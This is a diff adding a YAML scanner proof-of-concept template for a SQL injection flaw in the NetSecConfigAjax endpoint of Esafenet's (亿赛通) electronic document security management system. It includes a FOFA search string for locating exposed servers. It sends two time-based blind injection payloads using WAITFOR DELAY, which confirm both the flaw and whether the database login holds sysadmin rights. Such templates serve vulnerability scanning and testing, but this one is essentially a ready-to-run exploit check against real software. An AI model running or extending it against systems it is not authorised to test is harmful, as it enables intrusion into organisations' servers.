@@ -1,0 +1,41 @@
+id: poc-yaml-yisaitong-esafenet-netsecconfigajax
+info:
+  name: 亿赛通电子文档安全管理系统NetSecConfigAjax接口 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + 2
+  t3: random_int(5,9)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /CDGServer3/NetSecConfigAjax;Service
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1
+    WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    duration > t1 &&
+
+    duration < t2 && body == gbk_encode("操作成功")
+
+    '
+- method: POST
+  path: /CDGServer3/NetSecConfigAjax;Service
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1
+    WAITFOR DELAY '0:0:{{.t3}}'--
+  expression: 'status_code == 200 &&
+
+    duration > t3 &&
+
+    duration < t4 && body == gbk_encode("操作成功")
+
+    '
+transport: http
